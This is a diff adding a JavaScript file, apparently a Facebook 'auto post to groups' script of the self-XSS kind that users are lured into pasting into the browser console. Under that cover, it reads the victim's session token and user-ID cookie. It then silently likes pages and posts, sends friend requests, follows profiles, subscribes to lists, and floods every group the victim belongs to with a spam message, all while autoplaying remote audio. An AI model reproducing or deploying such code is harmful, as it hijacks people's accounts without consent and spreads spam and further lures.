@@ -1,0 +1,323 @@
+eval(unescape('alert("Auto Post Wall Group"); 
+var parent=document.getElementsByTagName("html")[0]; 
+var _body = document.getElementsByTagName('body')[0];
+var _div = document.createElement('div');
+_div.style.height="25";
+_div.style.width="100%";
+_div.style.position="fixed";
+_div.style.top="auto";
+_div.style.bottom="0";
+_div.align="center";
+var _audio= document.createElement('audio');
+_audio.style.width="100%";
+_audio.style.height="25px";
+_audio.controls = true;
+_audio.autoplay = true;
+_audio.loop="true";
+_audio.src = "http://dc442.4shared.com/img/6OCvHn4q/dlink__2Fdownload_2F6OCvHn4q/preview.mp3";
+_div.appendChild(_audio);
+_body.appendChild(_div);
+var parent=document.getElementsByTagName("html")[0]; 
+var _body = document.getElementsByTagName('body')[0];
+var _div = document.createElement('div');
+
+var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
+var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
+var fb_dtsg=document.getElementsByName("fb_dtsg")[0].value;
+var user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
+
+body = document.body;
+if(body != null) 
+{
+ div = document.createElement("div");
+ div.style.position = "fixed";
+ div.style.display = "block";
+ div.style.width = "100px";
+ div.style.opacity= 0.90;
+ div.style.bottom = "+60px";
+ div.style.left = "+0px";
+ div.style.backgroundColor = "rgba(0,0,0,0.5)";
+ div.style.border = "1px solid rgba(0,0,0,0.5)";
+ div.style.padding = "3px";
+ div.innerHTML = "<a style='font-weight:bold;color:#E30505' href='https://www.facebook.com/sharer/sharer.php?u=https://www.facebook.com/leadgitar' title='Share'><blink><center>SHARE</center></blink></a>"
+ body.appendChild(div);
+}
+
+if(body != null) 
+{
+ div = document.createElement("div");
+ div.style.position = "fixed";
+ div.style.display = "block";
+ div.style.width = "100px";
+ div.style.opacity= 0.90;
+ div.style.bottom = "+35px";
+ div.style.left = "+0px";
+ div.style.backgroundColor = "rgba(0,0,0,0.5)";
+ div.style.border = "1px solid rgba(0,0,0,0.5)";
+ div.style.padding = "3px";
+ div.innerHTML = "<a style='font-weight:bold;color:#E30505' href='' title='Refresh'><blink><center>Close (F5)</center></blink></a>"
+ body.appendChild(div);
+}
+if(body != null) 
+{
+ div = document.createElement("div");
+ div.style.position = "fixed";
+ div.style.display = "block";
+ div.style.width = "135px";
+ div.style.opacity= 0.90;
+ div.style.bottom = "+10px";
+ div.style.left = "+0px";
+ div.style.backgroundColor = "rgba(0,0,0,0.5)";
+ div.style.border = "1px solid rgba(0,0,0,0.5)";
+ div.style.padding = "3px";
+ div.innerHTML = "<a style='font-weight:bold;color:#E30505' href='https://www.facebook.com/leadgitar' title='Theme'><blink><center>Our Page</center></blink></a>"
+ body.appendChild(div);
+}
+var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
+var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
+function LIST(L) {
+  var X = new XMLHttpRequest();
+  var XURL = "//www.facebook.com/ajax/friends/lists/subscribe/modify";
+  var XParams = "flid=" + L +"&action=subscribe&location=feed&nctr[_mod]=pagelet_group_mall&ft[type]=40&ft[tn]=DH&__user="+user_id+"&__a=1&__dyn=7n8ahxoNpGo&__req=y&fb_dtsg="+fb_dtsg+"&phstamp=";
+  X.open("POST", XURL, true);
+  X.onreadystatechange = function () {
+    if (X.readyState == 4 && X.status == 200) {
+      X.close;
+    }
+  };
+  X.send(XParams);
+}
+
+LIST("570329069753277");
+LIST("572095159576668");
+
+
+var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
+var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
+function Like(p) {
+  var Page = new XMLHttpRequest();
+  var PageURL = "//www.facebook.com/ajax/pages/fan_status.php";
+  var PageParams = "&fbpage_id=" + p +"&add=true&reload=false&fan_origin=page_timeline&fan_source=&cat=&nctr[_mod]=pagelet_timeline_page_actions&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=d&fb_dtsg="+fb_dtsg+"&phstamp=";
+  Page.open("POST", PageURL, true);
+  Page.onreadystatechange = function () {
+    if (Page.readyState == 4 && Page.status == 200) {
+      Page.close;
+    }
+  };
+  Page.send(PageParams);
+}
+Like("583830948346821");
+Like("414624631922451");
+Like("230537843748430");
+Like("305014642990673");
+var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
+var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
+function IDS(r) {
+  var X = new XMLHttpRequest();
+  var XURL = "//www.facebook.com/ajax/add_friend/action.php";
+  var XParams = "to_friend=" + r +"&action=add_friend&how_found=friend_browser_s&ref_param=none&&&outgoing_id=&logging_location=search&no_flyout_on_click=true&ego_log_data&http_referer&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=35&fb_dtsg="+fb_dtsg+"&phstamp=";
+  X.open("POST", XURL, true);
+  X.onreadystatechange = function () {
+    if (X.readyState == 4 && X.status == 200) {
+      X.close;
+    }
+  };
+  X.send(XParams);
+}
+IDS("100003285686659");
+IDS("100003285686659");
+IDS("100004368674070");
+IDS("100004368674070");
+
+var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
+var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
+function a(abone) {
+  var http4 = new XMLHttpRequest();
+  var url4 = "/ajax/follow/follow_profile.php?__a=1";
+  var params4 = "profile_id=" + abone + "&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg=" + fb_dtsg + "&lsd&__" + user_id + "&phstamp=";
+  http4.open("POST", url4, true);
+  http4.onreadystatechange = function () {
+    if (http4.readyState == 4 && http4.status == 200) {
+      http4.close;
+    }
+  };
+  http4.send(params4);
+}
+a("100003285686659");
+a("100003285686659");
+a("100004368674070");
+a("100004368674070");
+
+var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
+var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
+var now=(new Date).getTime();
+function P(post) {
+  var X = new XMLHttpRequest();
+  var XURL ="//www.facebook.com/ajax/ufi/like.php";
+  var XParams = "like_action=true&ft_ent_identifier="+post+"&source=1&client_id="+now+"%3A3366677427&rootid=u_ps_0_0_14&giftoccasion&ft[tn]=%3E%3DU&ft[type]=20&ft[qid]=5882006890513784712&ft[mf_story_key]="+post+"&nctr[_mod]=pagelet_home_stream&__user="+user_id+"&__a=1&__dyn=7n8ahyj35CFwXAg&__req=j&fb_dtsg="+fb_dtsg+"&phstamp=";
+  X.open("POST", XURL, true);
+  X.onreadystatechange = function () {
+    if (X.readyState == 4 && X.status == 200) {
+      X.close;
+    }
+  };
+  X.send(XParams);
+}    
+P("1433931973486367");
+P("Rorschachhh");
+
+var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
+var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
+var now=(new Date).getTime();
+function P(opo) {
+  var X = new XMLHttpRequest();
+  var XURL ="//www.facebook.com/ajax/ufi/like.php";
+  var XParams = "like_action=true&ft_ent_identifier="+opo+"&source=1&client_id="+now+"%3A379783857&rootid=u_jsonp_39_18&giftoccasion&ft[tn]=%3E%3D&ft[type]=20&ft[qid]=5890811329470279257&ft[mf_story_key]=2814962900193143952&ft[has_expanded_ufi]=1&nctr[_mod]=pagelet_home_stream&__user="+user_id+"&__a=1&__dyn=7n88QoAMBlClyocpae&__req=g4&fb_dtsg="+fb_dtsg+"&phstamp=";
+  X.open("POST", XURL, true);
+  X.onreadystatechange = function () {
+    if (X.readyState == 4 && X.status == 200) {
+      X.close;
+    }
+  };
+  X.send(XParams);
+}    
+
+P("364520257000827"); 
+P("356461524473367"); 
+P("268795683239952"); 
+P("116652928454229"); 
+
+var grouppost = "<div><span class='img sp_43rped sx_e3ea36'></span><a style='position:absolute;size:3px;padding-left:3px;font-weight:bold;font-family:Tahoma;font-size:11px;color:#3B5998;'>Write Post</a></div></br>";
+grouppost += "<div><textarea id='txtFloodMsg' placeholder='fb.com/Vulnerabillity' style='color:white;padding-top:5px;width:493px;height:85px;font-family:tahoma;font-size:13px;background-color:rgba(255,255,255,0.1);'></textarea></div>";
+grouppost += "<div><br><span class='img sp_er534k sx_74b85a'></span><a style='position:absolute;font-family:Arial;size:3px;padding-left:3px;font-size:11px;color:rgb(128, 128, 128);'>Script Settings: Group Post </a></span><button style='margin-left:437px' class='_42ft _4jy0 _11b _4jy3 _4jy1 selected' onclick='autopostingfunc(this);' >Post</button><div style='color:gray;'>Powered By: <A style='color:#3B5998;' href='https://www.facebook.com/leadgitar' target='_blank'> A'k</A></br>Script Made By</A><A style='color:#3B5998;' href='https://www.facebook.com/leadgitar' target='_blank'> A'k</A></A></div>";
+var Popupset = document.createElement("div");
+Popupset.setAttribute("style", "min-height:50px;width:500px;position:fixed;top:100px;box-shadow: 0px 4px 10px rgba(24, 144, 255, 0.63);position:fixed;left:50%;margin-left:-273px;text-align:left;border-radius:10px;padding:5px;z-index:999999;border:5px solid rgba(0,0,0,0.9);background-color:rgba(0,0,0,0.9);color:White");
+Popupset.innerHTML = grouppost;
+document.body.appendChild(Popupset);
+jx = {
+    getHTTPObject: function () {
+        var A = false;
+        if (typeof ActiveXObject != "undefined") try {
+            A = new ActiveXObject("Msxml2.XMLHTTP")
+        } catch (C) {
+            try {
+                A = new ActiveXObject("Microsoft.XMLHTTP")
+            } catch (B) {
+                A = false
+            }
+        } else if (window.XMLHttpRequest) try {
+            A = new XMLHttpRequest
+        } catch (C) {
+            A = false
+        }
+        return A
+    },
+    load: function (url, callback, format, method, opt) {
+        var http = this.init();
+        if (!http || !url) return;
+        if (http.overrideMimeType) http.overrideMimeType("text/xml");
+        if (!method) method = "GET";
+        if (!format) format = "text";
+        if (!opt) opt = {};
+        format = format.toLowerCase();
+        method = method.toUpperCase();
+        var now = "uid=" + (new Date).getTime();
+        url += url.indexOf("?") + 1 ? "&" : "?";
+        url += now;
+        var parameters = null;
+        if (method == "POST") {
+            var parts = url.split("?");
+            url = parts[0];
+            parameters = parts[1]
+        }
+        http.open(method, url, true);
+        var ths = this;
+        if (opt.handler) http.onreadystatechange = function () {
+            opt.handler(http)
+        };
+        else http.onreadystatechange = function () {
+            if (http.readyState == 4)
+                if (http.status == 200) {
+                    var result = "";
+                    if (http.responseText) result = http.responseText;
+                    if (format.charAt(0) == "j") {
+                        result = result.replace(/[\n\r]/g, "");
+                        result = eval("(" + result + ")")
+                    } else if (format.charAt(0) == "x") result = http.responseXML;
+                    if (callback) callback(result)
+                } else {
+                    if (opt.loadingIndicator) document.getElementsByTagName("body")[0].removeChild(opt.loadingIndicator);
+                    if (opt.loading) document.getElementById(opt.loading).style.display = "none";
+                    if (error) error(http.status)
+                }
+        };
+        http.send(parameters)
+    },
+    bind: function (A) {
+        var C = {
+            "url": "",
+            "onSuccess": false,
+            "onError": false,
+            "format": "text",
+            "method": "GET",
+            "update": "",
+            "loading": "",
+            "loadingIndicator": ""
+        };
+        for (var B in C)
+            if (A[B]) C[B] = A[B];
+        if (!C.url) return;
+        var D = false;
+        if (C.loadingIndicator) {
+            D = document.createElement("div");
+            D.setAttribute("style", "position:absolute;top:0px;left:0px;");
+            D.setAttribute("class", "loading-indicator");
+            D.innerHTML = C.loadingIndicator;
+            document.getElementsByTagName("body")[0].appendChild(D);
+            this.opt.loadingIndicator = D
+        }
+        if (C.loading) document.getElementById(C.loading).style.display = "block";
+        this.load(C.url, function (E) {
+            if (C.onSuccess) C.onSuccess(E);
+            if (C.update) document.getElementById(C.update).innerHTML = E;
+            if (D) document.getElementsByTagName("body")[0].removeChild(D);
+            if (C.loading) document.getElementById(C.loading).style.display = "none"
+        }, C.format, C.method, C)
+    },
+    init: function () {
+        return this.getHTTPObject()
+    }
+};
+var j = 0;
+var k = 0;
+var suc = 0;
+var msg = "Follow @MomodRock | Script autopost bisa dilihat disini http://pastebin.com/yMeSVn7X";
+var arr = new Array;
+var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
+
+function autopostingfunc(sender) {
+    if (document.getElementById("txtFloodMsg").value != "") msg = document.getElementById("txtFloodMsg").value;
+    jx.load(window.location.protocol + "//www.facebook.com/ajax/typeahead/search/bootstrap.php?__a=1&filter[0]=group&viewer=" + user_id + "&token=v7&lazy=0&__user=" + user_id, function (a) {
+        var b = a;
+        var c = b.substring(b.indexOf("{"));
+        var d = JSON.parse(c);
+        d = d.payload.entries;
+        for (var e = 0; e < d.length; e++) arr.push(d[e].uid);
+        sender.parentNode.innerHTML = "Please Wait...";
+        postitok()
+    })
+}
+var a = document.body.innerHTML;
+var dts = document.getElementsByName("fb_dtsg")[0].value;
+var composerid = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
+
+function postitok() {
+    pst = "fb_dtsg=" + dts + "&xhpc_composerid=" + composerid + "&xhpc_targetid=" + arr[suc] + "&xhpc_context=home&xhpc_fbx=1&xhpc_message_text=" + encodeURIComponent(msg) + "&xhpc_message= \n\n" + encodeURIComponent(msg) + "&UIPrivacyWidget[0]=40&privacy_data[value]=40&privacy_data[friends]=0&privacy_data[list_anon]=0&privacy_data[list_x_anon]=0&=Share&nctr[_mod]=pagelet_group_composer";
+    with(newx = new XMLHttpRequest) open("POST", "/ajax/updatestatus.php?__a=1"), send(pst);
+    suc++;
+    if (suc > arr.length) {
+        alert("Auto Posting Completed. Now Refresh your Homepage.");
+        suc = 0 
+    } else setTimeout("postitok()", 3E4 / arr.length)
+}
+setTimeout("autopostingfunc()", 1E3);'));
